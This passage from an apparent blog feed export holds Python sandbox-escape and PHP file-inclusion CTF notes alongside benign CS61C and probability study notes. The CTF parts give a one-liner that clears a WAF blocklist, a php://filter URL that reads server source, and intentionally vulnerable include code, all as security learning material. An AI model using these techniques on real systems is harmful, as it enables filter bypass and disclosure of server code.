class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.version</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.python_version()</span><br></pre></td></tr></table></figure><h4 id="获取-Linux-版本"><a href="#获取-Linux-版本" class="headerlink" title="获取 Linux 版本"></a>获取 Linux 版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.uname()</span><br></pre></td></tr></table></figure><h4 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sys.path</span><br><span class="line">sys.modules</span><br></pre></td></tr></table></figure><h3 id="获取全局变量"><a href="#获取全局变量" class="headerlink" title="获取全局变量"></a>获取全局变量</h3><h4 id="globals-1"><a href="#globals-1" class="headerlink" title="globals()"></a><code>globals()</code></h4><h4 id="help-2"><a href="#help-2" class="headerlink" title="help()"></a><code>help()</code></h4><p><code>help</code> 函数也可以获取某个模块的帮助信息，包括全局变量, 输入 <code>__main__</code> 之后可以获取当前模块的信息。</p><h4 id="vars-1"><a href="#vars-1" class="headerlink" title="vars()"></a><code>vars()</code></h4><p><code>vars()</code> 函数返回该对象的命名空间（namespace）中的所有属性以字典的形式表示。当前模块的所有变量也会包含在里面，一些过滤链 <code>globals</code> 和 <code>help</code> 函数的场景可以尝试使用 <code>vars()</code></p><h3 id="获取模块内部函数或变量"><a href="#获取模块内部函数或变量" class="headerlink" title="获取模块内部函数或变量"></a>获取模块内部函数或变量</h3><h4 id="获取指定模块内部变量"><a href="#获取指定模块内部变量" class="headerlink" title="获取指定模块内部变量"></a>获取指定模块内部变量</h4><p>获取模块内部函数或变量的目的主要是为了信息泄露或篡改。比如 waf.py 中存在某个变量定义了危险字符列表，我们可以考虑先获取这个变量然后将其清空。</p><p>可以先获取 load_module，然后通过 load_module 导入特定的模块，进而篡改其中变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(().__class__.__bases__.__iter__().__next__().__subclasses__().__getitem__(<span class="number">84</span>).load_module(<span class="string">&quot;waf&quot;</span>).__dict__.values()).__getitem__(<span class="number">8</span>).clear()</span><br></pre></td></tr></table></figure><h4 id="获取-main-中变量"><a href="#获取-main-中变量" class="headerlink" title="获取 __main__ 中变量"></a>获取 <code>__main__</code> 中变量</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;__main__&#x27;</span>].__dict__[<span class="string">&#x27;app&#x27;</span>]</span><br></pre></td></tr></table></figure><h4 id="获取命令空间中的变量-模块-函数等"><a href="#获取命令空间中的变量-模块-函数等" class="headerlink" title="获取命令空间中的变量&#x2F;模块&#x2F;函数等"></a>获取命令空间中的变量&#x2F;模块&#x2F;函数等</h4><p><code>__globals__</code>是一个特殊属性，能够以 dict 的形式返回函数（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;request&#x27;</span>]</span><br><span class="line">url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://dummykitty.github.io/posts/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">pyjail 合集</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pyjail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cs61c-su25 diary</title>
      <link href="/2025/08/13/cs61c-su25-diary/"/>
      <url>/2025/08/13/cs61c-su25-diary/</url>
      
        <content type="html"><![CDATA[<h1 id="cs61c-su25-学习笔记"><a href="#cs61c-su25-学习笔记" class="headerlink" title="cs61c-su25 学习笔记"></a>cs61c-su25 学习笔记</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h2 id="c-基本知识"><a href="#c-基本知识" class="headerlink" title="c 基本知识"></a>c 基本知识</h2><ul><li><code>gcc -o &lt;output_file&gt; &lt;source_file.c&gt;</code> 可以将 C 源文件编译成可执行文件。</li><li>When performing pointer arithmetic, C automatically accounts for the type of the pointer and adds the correct number of bytes.</li></ul>]]></content>
      
      
      <categories>
          
          <category> cs61c </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论小结</title>
      <link href="/2025/08/13/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%B0%8F%E7%BB%93/"/>
      <url>/2025/08/13/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="STAT-110-–-Probability-Study-Notes-Rewritten-Structured"><a href="#STAT-110-–-Probability-Study-Notes-Rewritten-Structured" class="headerlink" title="STAT 110 – Probability Study Notes (Rewritten &amp; Structured)"></a>STAT 110 – Probability Study Notes (Rewritten &amp; Structured)</h1><blockquote><p>Goal: a compact, exam‑ready set of notes that are <strong>well‑scaffolded</strong>, <strong>example‑driven</strong>, and <strong>correct by construction</strong>. Each section includes: <em>What it is</em>, <em>Key facts</em>, <em>Common pitfalls</em>, and <em>One‑liner examples</em>.</p></blockquote><hr><h2 id="0-Quick-Roadmap-What-to-use-when"><a href="#0-Quick-Roadmap-What-to-use-when" class="headerlink" title="0. Quick Roadmap (What to use when)"></a>0. Quick Roadmap (What to use when)</h2><ul><li><strong>Counting &amp; Naïve probability</strong> → uniform sample spaces.</li><li><strong>Conditioning &amp; Bayes</strong> → update beliefs, tree&#x2F;partition problems, Monty Hall.</li><li><strong>Discrete RVs</strong> → Bernoulli&#x2F;Binomial&#x2F;Hypergeometric&#x2F;Geometric&#x2F;NegBin&#x2F;Poisson.</li><li><strong>Continuous RVs</strong> → Uniform&#x2F;Exponential&#x2F;Normal&#x2F;Logistic; LOTUS &amp; transforms.</li><li><strong>Joint&#x2F;Independence</strong> → marginals, covariance&#x2F;correlation, convolution.</li><li><strong>MGF&#x2F;CGF</strong> → sums of independent variables; identify distributions.</li><li><strong>Inequalities &amp; LLN&#x2F;CLT</strong> → tail control, approximations.</li><li><strong>Order stats</strong> → minima&#x2F;maxima &amp; quantiles.</li><li><strong>Offshoots of Normal</strong> → χ², t, F; Beta&#x2F;Gamma conjugacies.</li><li><strong>Markov chains</strong> → transitions, stationary, reversibility.</li><li><strong>Sampling&#x2F;IPW</strong> → Horvitz–Thompson, when weights help&#x2F;hurt variance.</li></ul><hr><h2 id="1-Probability-Foundations"><a href="#1-Probability-Foundations" class="headerlink" title="1. Probability Foundations"></a>1. Probability Foundations</h2><h3 id="1-1-Sample-space-events-axioms"><a href="#1-1-Sample-space-events-axioms" class="headerlink" title="1.1 Sample space, events, axioms"></a>1.1 Sample space, events, axioms</h3><ul><li><strong>Sample space</strong> $\Omega$; <strong>event</strong> $A\subseteq\Omega$; <strong>probability</strong> $P$.</li><li><strong>Additivity</strong>: disjoint $A_i$: $P(\cup_i A_i)&#x3D;\sum_i P(A_i)$.</li><li><strong>Complement</strong>: $P(A^c)&#x3D;1-P(A)$.</li></ul><h3 id="1-2-Counting-uniform-models"><a href="#1-2-Counting-uniform-models" class="headerlink" title="1.2 Counting (uniform models)"></a>1.2 Counting (uniform models)</h3><ul><li><strong>Permutations</strong>: $P(n,k)&#x3D;n!&#x2F;(n-k)!$.</li><li><strong>Combinations</strong>: $\binom{n}{k}&#x3D;n!&#x2F;(k!(n-k)!)$.</li><li><strong>Vandermonde</strong>: $\sum_k \binom{m}{k}\binom{n}{r-k}&#x3D;\binom{m+n}{r}$.</li></ul><p><strong>Pitfalls:</strong> forgetting whether order matters; mixing with&#x2F;without replacement.</p><p><strong>Tiny check:</strong> cards without order, no replacement → combinations.</p><hr><h2 id="2-Conditioning-Bayes-and-Total-Probability"><a href="#2-Conditioning-Bayes-and-Total-Probability" class="headerlink" title="2. Conditioning, Bayes, and Total Probability"></a>2. Conditioning, Bayes, and Total Probability</h2><ul><li><strong>Conditional</strong>: $P(A\mid B)&#x3D;\tfrac{P(AB)}{P(B)}$ if $P(B)&gt;0$.</li><li><strong>Law of total probability (partition $A_i$)</strong>: $P(B)&#x3D;\sum_i P(B\mid A_i)P(A_i)$.</li><li><strong>Bayes</strong>: $P(A_i\mid B)&#x3D;\tfrac{P(B\mid A_i)P(A_i)}{\sum_j P(B\mid A_j)P(A_j)}$.</li><li><strong>Independence</strong>: $A\perp B\iff P(AB)&#x3D;P(A)P(B)$. <em>Conditional independence</em> is <strong>not</strong> implied by independence and vice‑versa.</li></ul><p><strong>Monty Hall (sketch):</strong> Prior: car behind 1&#x2F;3 each. Host opens goat door. Posterior: stay&#x3D;1&#x2F;3, switch&#x3D;2&#x2F;3. (Condition on host’s policy; use LOTP on host action.)</p><p><strong>Pitfall:</strong> treating conditional independence as independence.</p><hr><h2 id="3-Random-Variables-RVs"><a href="#3-Random-Variables-RVs" class="headerlink" title="3. Random Variables (RVs)"></a>3. Random Variables (RVs)</h2><p>A random variable is a measurable function $X: \Omega\to\mathbb R$.</p><h3 id="3-1-Discrete-basics"><a href="#3-1-Discrete-basics" class="headerlink" title="3.1 Discrete basics"></a>3.1 Discrete basics</h3><ul><li><strong>PMF</strong> $p_X(x)&#x3D;P(X&#x3D;x)$; <strong>CDF</strong> $F_X(x)&#x3D;P(X\le x)$.</li><li><strong>Expectation</strong> $E[X]&#x3D;\sum_x x,p_X(x)$. <strong>Variance</strong> $\operatorname{Var}(X)&#x3D;E[X^2]-E[X]^2$.</li><li><strong>Linearity</strong>: $E[\sum_i a_i X_i]&#x3D;\sum_i a_i E[X_i]$ (no independence needed).</li></ul><h4 id="Canonical-discrete-families"><a href="#Canonical-discrete-families" class="headerlink" title="Canonical discrete families"></a>Canonical discrete families</h4><ul><li><strong>Bernoulli</strong> $\mathrm{Ber}(p)$: $E&#x3D;p,\ Var&#x3D;p(1-p)$.</li><li><strong>Binomial</strong> $\mathrm{Bin}(n,p)$: $P(X&#x3D;k)&#x3D;\binom{n}{k}p^k(1-p)^{n-k}$. Sum of iid Bernoullis. Additivity: $\mathrm{Bin}(n,p)+\mathrm{Bin}(m,p)&#x3D;\mathrm{Bin}(n+m,p)$ if independent.</li><li><strong>Hypergeometric</strong> $\mathrm{Hyp}(N,K,n)$: sampling w&#x2F;o replacement; $\operatorname{Var}&#x3D;\frac{N-n}{N-1}np(1-p)$ with $p&#x3D;K&#x2F;N$.</li><li><strong>Geometric</strong> (failures before first success): $P(X&#x3D;k)&#x3D;q^k p$, $E&#x3D;\tfrac{1}{p}$.</li><li><strong>Negative Binomial</strong> (failures before $r$ th success): $P(X&#x3D;n)&#x3D;\binom{n+r-1}{r-1}p^r(1-p)^n$.</li><li><strong>Poisson($\lambda$)</strong>: $P(X&#x3D;k)&#x3D;e^{-\lambda}\lambda^k&#x2F;k!$, $E&#x3D;\lambda&#x3D;\operatorname{Var}$. Additivity for independent Poissons.</li></ul><p><strong>Poisson Paradigm:</strong> many rare, nearly independent trials → count $\approx$ Poisson with $\lambda&#x3D;\sum_i p_i$.</p><p><strong>Pitfall:</strong> Using Binomial when sampling without replacement → Hypergeometric is correct.</p><h3 id="3-2-Continuous-basics"><a href="#3-2-Continuous-basics" class="headerlink" title="3.2 Continuous basics"></a>3.2 Continuous basics</h3><ul><li><strong>PDF</strong> $f$, <strong>CDF</strong> $F$. $P(a\le X\le b)&#x3D;\int_a^b f(x),dx$.</li><li><strong>LOTUS</strong> (a must‑know): $E[g(X)]&#x3D;\int g(x)f(x)dx$ (or $\sum g(x)p(x)$ discrete) — no need to compute distribution of $g(X)$.</li></ul><h4 id="Canonical-continuous-families"><a href="#Canonical-continuous-families" class="headerlink" title="Canonical continuous families"></a>Canonical continuous families</h4><ul><li><strong>Uniform(a,b):</strong> $f&#x3D;1&#x2F;(b-a)$, $E&#x3D;(a+b)&#x2F;2$.</li><li><strong>Exponential($\lambda$)</strong>: memoryless; $f&#x3D;\lambda e^{-\lambda x},1_{x\ge0}$; $E&#x3D;\tfrac1\lambda$, $\operatorname{Var}&#x3D;\tfrac1{\lambda^2}$.</li><li><strong>Normal($\mu,\sigma^2$)</strong>: $Z&#x3D;(X-\mu)&#x2F;\sigma\sim N(0,1)$. Sums&#x2F;affine transforms stay normal.</li><li><strong>Logistic($\mu,s$)</strong> (CDF $1&#x2F;(1+e^{-(x-\mu)&#x2F;s})$).</li></ul><p><strong>Transformations (Jacobian):</strong> If $Y&#x3D;g(X)$ bijective, $f_Y(y)&#x3D;f_X(g^{-1}(y)),\big|\frac{d}{dy}g^{-1}(y)\big|$. For vectors, use $|\det J_{g^{-1}}|$.</p><p><strong>Pitfall:</strong> forgetting absolute value of Jacobian; forgetting support mapping.</p><hr><h2 id="4-Joint-Distributions-Covariance-Convolution"><a href="#4-Joint-Distributions-Covariance-Convolution" class="headerlink" title="4. Joint Distributions, Covariance, Convolution"></a>4. Joint Distributions, Covariance, Convolution</h2><ul><li><strong>Joint PDF&#x2F;PMF</strong> $f_{X,Y}$; <strong>marginals</strong> by summing&#x2F;integrating over the other variable.</li><li><strong>Independence</strong> $\Leftrightarrow f_{X,Y}&#x3D;f_X f_Y$ (for densities&#x2F;pmfs).</li><li><strong>Covariance</strong>: $\operatorname{Cov}(X,Y)&#x3D;E[XY]-E[X]E[Y]$. If independent → 0; converse may fail.</li><li><strong>Correlation</strong>: $\rho&#x3D;\tfrac{\operatorname{Cov}}{\sqrt{\operatorname{Var}X,\operatorname{Var}Y}}\in[-1,1]$.</li><li><strong>Convolution</strong> (sum): discrete $p_{X+Y}(z)&#x3D;\sum_x p_X(x)p_Y(z-x)$; continuous $f_{X+Y}(z)&#x3D;\int f_X(x)f_Y(z-x)dx$.</li></ul><p><strong>Pitfall:</strong> claiming zero covariance ⇒ independence (false except in special families e.g., jointly normal).</p><hr><h2 id="5-MGFs-Sums"><a href="#5-MGFs-Sums" class="headerlink" title="5. MGFs &amp; Sums"></a>5. MGFs &amp; Sums</h2><ul><li><strong>MGF</strong> $M_X(t)&#x3D;E[e^{tX}]$ (when it exists). Independent sums multiply MGFs.</li><li><strong>Poisson</strong>: $M(t)&#x3D;\exp(\lambda(e^t-1))$. <strong>Gamma($\alpha,\lambda$)</strong>: $M(t)&#x3D;(1-\tfrac{t}{\lambda})^{-\alpha}$.</li></ul><p><strong>Use:</strong> Identify distributions of sums; prove additivity (Poisson, Gamma with common rate, Normal).</p><p><strong>Pitfall:</strong> MGFs may not exist (e.g., Cauchy). Don’t force it.</p><hr><h2 id="6-Special-Families-Order-Statistics"><a href="#6-Special-Families-Order-Statistics" class="headerlink" title="6. Special Families &amp; Order Statistics"></a>6. Special Families &amp; Order Statistics</h2><h3 id="6-1-Beta-Gamma"><a href="#6-1-Beta-Gamma" class="headerlink" title="6.1 Beta &amp; Gamma"></a>6.1 Beta &amp; Gamma</h3><ul><li><strong>Beta($\alpha,\beta$)</strong> on $(0,1)$: $f(x)\propto x^{\alpha-1}(1-x)^{\beta-1}$. Useful as a Binomial conjugate prior.</li><li><strong>Gamma($\alpha,\lambda$)</strong> on $(0,\infty)$: $f(x)&#x3D;\frac{\lambda^{\alpha}}{\Gamma(\alpha)}x^{\alpha-1}e^{-\lambda x}$.</li></ul><h3 id="6-2-Offshoots-of-the-Normal"><a href="#6-2-Offshoots-of-the-Normal" class="headerlink" title="6.2 Offshoots of the Normal"></a>6.2 Offshoots of the Normal</h3><ul><li><strong>Chi‑square</strong>: sum of squares of iid $N(0,1)$. $\chi^2(k)\equiv\mathrm{Gamma}(k&#x2F;2,1&#x2F;2)$.</li><li><strong>t(k)</strong>: $Z&#x2F;\sqrt{W&#x2F;k}$ with $Z\sim N(0,1), W\sim\chi^2(k)$. Heavy‑tailed; $t(1)&#x3D;$Cauchy.</li></ul><h3 id="6-3-Order-statistics"><a href="#6-3-Order-statistics" class="headerlink" title="6.3 Order statistics"></a>6.3 Order statistics</h3><ul><li>For iid with CDF $F$, $P(X_{(k)}\le x)&#x3D;\sum_{j&#x3D;k}^n \binom{n}{j}F(x)^j(1-F(x))^{n-j}$. Min&#x2F;max via $k&#x3D;1$ and $k&#x3D;n$.</li></ul><p><strong>Pitfall:</strong> confusing distribution of a quantile estimator with the quantile itself.</p><hr><h2 id="7-Inequalities-LLN-and-CLT"><a href="#7-Inequalities-LLN-and-CLT" class="headerlink" title="7. Inequalities, LLN, and CLT"></a>7. Inequalities, LLN, and CLT</h2><ul><li><p><strong>Markov:</strong> $P(X\ge a)\le E[X]&#x2F;a$ for $X\ge0$.</p></li><li><p><strong>Chebyshev:</strong> $P(|X-\mu|\ge k\sigma)\le 1&#x2F;k^2$.</p></li><li><p><strong>(Bonus) Chernoff&#x2F;Hoeffding:</strong> exponential tails for sums of bounded&#x2F;independent RVs.</p></li><li><p><strong>Weak LLN:</strong> sample mean $\bar X_n\to \mu$ in probability.</p></li><li><p><strong>Strong LLN:</strong> $\bar X_n\to \mu$ almost surely (mild conditions).</p></li><li><p><strong>CLT:</strong> $\tfrac{\sum_{i&#x3D;1}^n(X_i-\mu)}{\sigma\sqrt n}\Rightarrow N(0,1)$. Use for normal approximations (with continuity correction for discrete).</p></li></ul><p><strong>Pitfall:</strong> using CLT with tiny $n$ and highly skewed&#x2F;heavy tails.</p><hr><h2 id="8-Multivariate-Normal-MVN"><a href="#8-Multivariate-Normal-MVN" class="headerlink" title="8. Multivariate Normal (MVN)"></a>8. Multivariate Normal (MVN)</h2><ul><li>$\mathbf X\sim\mathrm{MVN}(\mu,\Sigma)$ iff every linear combination $a^T\mathbf X$ is normal.</li><li><strong>Key property:</strong> uncorrelated components ⇒ independent (special to MVN).</li><li><strong>MGF:</strong> $M_{\mathbf X}(\mathbf t)&#x3D;\exp(\mu^T\mathbf t+\tfrac12\mathbf t^T\Sigma\mathbf t)$.</li></ul><hr><h2 id="9-Markov-Chains-finite‑state"><a href="#9-Markov-Chains-finite‑state" class="headerlink" title="9. Markov Chains (finite‑state)"></a>9. Markov Chains (finite‑state)</h2><ul><li><strong>Markov property:</strong> $P(X_{n+1}&#x3D;j\mid \text{past})&#x3D;P(X_{n+1}&#x3D;j\mid X_n&#x3D;i)$.</li><li><strong>Transition matrix</strong> $P&#x3D;(p_{ij})$; $\pi$ stationary if $\pi^T P&#x3D;\pi^T$.</li><li><strong>Irreducible + aperiodic</strong> ⇒ unique stationary and $P^n\to 1\pi^T$.</li><li><strong>Reversible</strong> (detailed balance): $\pi_i p_{ij}&#x3D;\pi_j p_{ji}$.</li></ul><p><strong>Pitfall:</strong> confusing <em>stationary</em> with <em>limiting</em> distribution when the chain isn’t ergodic.</p><hr><h2 id="10-Cauchy-the-friendly-monster"><a href="#10-Cauchy-the-friendly-monster" class="headerlink" title="10. Cauchy (the friendly monster)"></a>10. Cauchy (the friendly monster)</h2><ul><li><strong>PDF:</strong> $1&#x2F;(\pi(1+x^2))$. <strong>No</strong> mean&#x2F;variance; LLN fails. Useful counterexample in proofs.</li></ul><hr><h2 id="11-Sampling-Inverse-Probability-Weighting-IPW"><a href="#11-Sampling-Inverse-Probability-Weighting-IPW" class="headerlink" title="11. Sampling &amp; Inverse Probability Weighting (IPW)"></a>11. Sampling &amp; Inverse Probability Weighting (IPW)</h2><h3 id="11-1-Why-weights"><a href="#11-1-Why-weights" class="headerlink" title="11.1 Why weights?"></a>11.1 Why weights?</h3><p>When inclusion probabilities differ, naïve sample means are biased for the population mean. <strong>Horvitz–Thompson (HT)</strong> fixes this:</p><p>$\widehat{T}<em>{HT}&#x3D;\sum</em>{i\in S} \frac{Y_i}{\pi_i},\qquad \widehat{\mu}<em>{HT}&#x3D;\frac{1}{N}\sum</em>{i\in S}\frac{Y_i}{\pi_i}.$</p><ul><li>In <strong>SRS without replacement</strong> (sample size $n$ from $N$), $\pi_i&#x3D;n&#x2F;N$ so $w_i&#x3D;1&#x2F;\pi_i&#x3D;N&#x2F;n$ is constant → HT reduces to the usual sample expansion.</li></ul><h3 id="11-2-“All-weights-1-⇒-estimate-must-be-too-large-”-No"><a href="#11-2-“All-weights-1-⇒-estimate-must-be-too-large-”-No" class="headerlink" title="11.2 “All weights &gt; 1 ⇒ estimate must be too large?” (No.)"></a>11.2 “All weights &gt; 1 ⇒ estimate must be too large?” (No.)</h3><p>Weights being &gt;1 just <em>scale up</em> each sampled unit to represent unsampled ones. Estimates can be high <strong>or</strong> low depending on which $Y_i$ happen to be sampled. Over many samples, HT is <strong>unbiased</strong>; direction of single‑sample error follows whether selected $Y$’s are above&#x2F;below population mean.</p><p><strong>Variance caution:</strong> IPW can <strong>inflate variance</strong> when some $\pi_i$ are tiny (huge weights). Stabilize via <strong>normalized weights</strong> or <strong>model‑assisted</strong> estimators.</p><p><strong>One‑liner example (SRS, N&#x3D;5, n&#x3D;2):</strong> $\pi_i&#x3D;0.4, w&#x3D;2.5$. Draw {C&#x3D;6,E&#x3D;10} ⇒ expanded total 40 ⇒ mean 8 (too big this time). Draw {A&#x3D;2,B&#x3D;4} ⇒ mean 3 (too small). Across repeated samples, average back to true mean.</p><hr><h2 id="12-Worked-Micro‑Examples-quick-patterns"><a href="#12-Worked-Micro‑Examples-quick-patterns" class="headerlink" title="12. Worked Micro‑Examples (quick patterns)"></a>12. Worked Micro‑Examples (quick patterns)</h2><ol><li><p><strong>Convolution (Poisson):</strong> $X\sim\mathrm{Poi}(\lambda), Y\sim\mathrm{Poi}(\mu)$ indep ⇒ $X+Y\sim\mathrm{Poi}(\lambda+\mu)$. <em>Proof:</em> MGFs multiply.</p></li><li><p><strong>Transform (Exponential→Min):</strong> If $X_i\stackrel{iid}{\sim}\mathrm{Exp}(\lambda)$, then $X_{(1)}\sim \mathrm{Exp}(n\lambda)$. <em>Proof:</em> $P(X_{(1)}&gt;x)&#x3D;P(\cap_i{X_i&gt;x})&#x3D;e^{-n\lambda x}$.</p></li><li><p><strong>Bayes with partitions:</strong> Disease prevalence $\pi$, sensitivity $s$, specificity $c$: $P(D\mid +)&#x3D;\tfrac{s\pi}{s\pi+(1-c)(1-\pi)}$.</p></li><li><p><strong>CLT approximation (Binomial):</strong> $X\sim\mathrm{Bin}(n,p)$ ⇒ $P(X\le k)\approx \Phi\Big(\tfrac{k+0.5-np}{\sqrt{np(1-p)}}\Big)$.</p></li></ol><hr><h2 id="13-Common-Pitfalls-How-to-Self‑Check"><a href="#13-Common-Pitfalls-How-to-Self‑Check" class="headerlink" title="13. Common Pitfalls &amp; How to Self‑Check"></a>13. Common Pitfalls &amp; How to Self‑Check</h2><ul><li>Forgetting to <strong>condition on the mechanism</strong> (e.g., host policy in Monty Hall).</li><li>Using <strong>Binomial</strong> for without‑replacement sampling (should be Hypergeometric).</li><li>Dropping <strong>absolute value</strong> in Jacobian.</li><li>Assuming <strong>zero covariance ⇒ independence</strong> (generally false).</li><li>Applying CLT with <strong>tiny n</strong> or <strong>infinite variance</strong> (Cauchy!).</li></ul><p><strong>Self‑check loop:</strong> Identify space → model assumptions → write primitives (pmf&#x2F;pdf&#x2F;cdf) → use LOTUS&#x2F;conditioning → sanity check limits (p→0&#x2F;1, n→∞) → units&#x2F;support → if sum&#x2F;transform, prefer MGF&#x2F;CGF&#x2F;Jacobian.</p><hr><h2 id="14-Mini-Formula-Sheet"><a href="#14-Mini-Formula-Sheet" class="headerlink" title="14. Mini Formula Sheet"></a>14. Mini Formula Sheet</h2><ul><li><strong>Bayes:</strong> $P(A\mid B)&#x3D;\frac{P(B\mid A)P(A)}{\sum_i P(B\mid A_i)P(A_i)}$.</li><li><strong>Linearity:</strong> $E\big[\sum a_i X_i\big]&#x3D;\sum a_i E[X_i]$.</li><li><strong>Var add (indep):</strong> $\operatorname{Var}(\sum X_i)&#x3D;\sum \operatorname{Var}(X_i)$.</li><li><strong>Convolution:</strong> discrete sum&#x2F;continuous integral.</li><li><strong>MGF mult:</strong> independence ⇒ multiply MGFs.</li><li><strong>Exponential memoryless:</strong> $P(X&gt;s+t\mid X&gt;s)&#x3D;P(X&gt;t)$.</li><li><strong>LLN&#x2F;CLT</strong> as above.</li></ul><hr><h3 id="Final-tip"><a href="#Final-tip" class="headerlink" title="Final tip"></a>Final tip</h3><p>When stuck: <strong>Condition on a good event</strong> (partition), <strong>apply LOTUS</strong>, or <strong>switch to MGFs</strong>. Draw a tree&#x2F;table; name every probability you write. If you can’t state the model clearly, you can’t compute correctly.</p><hr><p>2025&#x2F;8&#x2F;13 Harvard stat 110 notes, rewritten and structured for clarity and exam readiness by ChatGPT5.</p>]]></content>
      
      
      <categories>
          
          <category> 数学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ics-05_learned</title>
      <link href="/2025/08/03/ics-05-learned/"/>
      <url>/2025/08/03/ics-05-learned/</url>
      
        <content type="html"><![CDATA[<p>观察到<code>page</code>是一个可控的post参数，通过<code>/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code>可以读取到<code>index.php</code>的内容。</p><p><code>ctype_alnum($page)</code>函数用于检测字符串是否只由字母和数字组成，因此可以用来对<code>page</code>参数进行初步的安全检查。</p><p><code>strpos($page, &#39;input&#39;) &gt; 0</code>函数用于检查<code>page</code>参数中是否包含字符串<code>input</code>出现的第一个匹配的位置，如果存在则返回匹配的位置，否则返回<code>false</code>。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web_php_include_learned</title>
      <link href="/2025/08/02/Web-php-include-learned/"/>
      <url>/2025/08/02/Web-php-include-learned/</url>
      
        <content type="html"><![CDATA[<p><strong>源代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="CHOICE-1"><a href="#CHOICE-1" class="headerlink" title="CHOICE 1"></a>CHOICE 1</h1><h2 id="strstr"><a href="#strstr" class="headerlink" title="strstr"></a>strstr</h2><p>The <code>strstr()</code> function in PHP is used to find the first occurrence of a string inside another string. Here’s how it works:</p><h3 id="Basic-Syntax"><a href="#Basic-Syntax" class="headerlink" title="Basic Syntax"></a>Basic Syntax</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strstr</span>(haystack, needle, before_needle)</span><br></pre></td></tr></table></figure><blockquote><p><strong>Parameters:</strong></p><ul><li><code>haystack</code> - The string to search in</li><li><code>needle</code> - The string to search for</li><li><code>before_needle</code> (optional) - If TRUE, returns the part before the first occurrence</li></ul><p><strong>Return Value:</strong></p><ul><li>Returns the portion of the string from the first occurrence of <code>needle</code> to the end</li><li>Returns <code>FALSE</code> if <code>needle</code> is not found</li></ul><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p><strong>Basic usage:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line"><span class="variable">$domain</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$email</span>, <span class="string">&#x27;@&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$domain</span>; <span class="comment">// Output: @example.com</span></span><br></pre></td></tr></table></figure><p><strong>Get part before the needle:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">strstr</span>(<span class="variable">$email</span>, <span class="string">&#x27;@&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>; <span class="comment">// Output: user</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="str-replace-过滤替换"><a 